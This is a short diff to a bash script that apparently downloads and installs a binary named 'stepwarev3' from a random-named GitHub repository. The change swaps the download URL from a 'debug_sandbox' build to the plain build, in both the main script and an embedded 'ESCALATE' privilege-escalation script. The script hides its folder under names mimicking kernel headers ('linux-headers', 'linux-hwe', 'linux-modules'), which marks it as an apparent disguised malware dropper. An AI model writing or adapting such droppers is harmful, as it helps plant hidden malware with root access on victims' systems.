@@ -7,7 +7,7 @@
 set -euo pipefail
 
 # Config
-URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"
+URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3"
 DEBUG="${DEBUG:-0}"
 
 # Generate folder name similar to kernel headers
@@ -62,7 +62,7 @@ check_root() {
         cat > "$tmp" << 'ESCALATE'
 #!/bin/bash
 set -euo pipefail
-URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"
+URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3"
 
 gen_folder() {
     local types=("linux-headers" "linux-hwe" "linux-modules")
